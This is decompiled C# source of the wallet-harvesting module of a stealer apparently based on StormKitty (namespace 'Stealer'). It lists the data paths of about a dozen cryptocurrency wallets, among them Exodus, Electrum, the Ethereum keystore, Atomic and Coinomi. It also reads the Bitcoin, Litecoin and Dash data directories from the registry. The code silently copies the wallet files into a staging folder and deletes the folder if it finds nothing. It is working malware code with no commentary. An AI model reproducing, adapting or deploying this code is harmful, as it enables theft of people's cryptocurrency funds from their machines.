﻿using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using StormKitty;

namespace Stealer
{
	// Token: 0x0200002E RID: 46
	internal sealed class Wallets
	{
		// Token: 0x060000C6 RID: 198 RVA: 0x00006910 File Offset: 0x00004B10
		public static void GetWallets(string sSaveDir)
		{
			try
			{
				Directory.CreateDirectory(sSaveDir);
				foreach (string[] array in Wallets.sWalletsDirectories)
				{
					Wallets.CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
				}
				foreach (string sWalletRegistry in Wallets.sWalletsRegistry)
				{
					Wallets.CopyWalletFromRegistryTo(sSaveDir, sWalletRegistry);
				}
				if (Counter.Wallets == 0)
				{
					Filemanager.RecursiveDelete(sSaveDir);
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x000069B0 File Offset: 0x00004BB0
		private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
		{
			string destFolder = Path.Combine(sSaveDir, sWalletName);
			if (Directory.Exists(sWalletDir))
			{
				Filemanager.CopyDirectory(sWalletDir, destFolder);
				Counter.Wallets++;
			}
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x000069E4 File Offset: 0x00004BE4
		private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
		{
			string destFolder = Path.Combine(sSaveDir, sWalletRegistry);
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey(sWalletRegistry).OpenSubKey(sWalletRegistry + "-Qt"))
				{
					if (registryKey != null)
					{
						string text = registryKey.GetValue("strDataDir").ToString() + "\\wallets";
						if (Directory.Exists(text))
						{
							Filemanager.CopyDirectory(text, destFolder);
							Counter.Wallets++;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400007A RID: 122
		private static List<string[]> sWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Zcash",
				Paths.appdata + "\\Zcash"
			},
			new string[]
			{
				"Armory",
				Paths.appdata + "\\Armory"
			},
			new string[]
			{
				"Bytecoin",
				Paths.appdata + "\\bytecoin"
			},
			new string[]
			{
				"Jaxx",
				Paths.appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
			},
			new string[]
			{
				"Exodus",
				Paths.appdata + "\\Exodus\\exodus.wallet"
			},
			new string[]
			{
				"Ethereum",
				Paths.appdata + "\\Ethereum\\keystore"
			},
			new string[]
			{
				"Electrum",
				Paths.appdata + "\\Electrum\\wallets"
			},
			new string[]
			{
				"AtomicWallet",
				Paths.appdata + "\\atomic\\Local Storage\\leveldb"
			},
			new string[]
			{
				"Guarda",
				Paths.appdata + "\\Guarda\\Local Storage\\leveldb"
			},
			new string[]
			{
				"Coinomi",
				Paths.lappdata + "\\Coinomi\\Coinomi\\wallets"
			}
		};

		// Token: 0x0400007B RID: 123
		private static string[] sWalletsRegistry = new string[]
		{
			"Litecoin",
			"Dash",
			"Bitcoin"
		};
	}
}
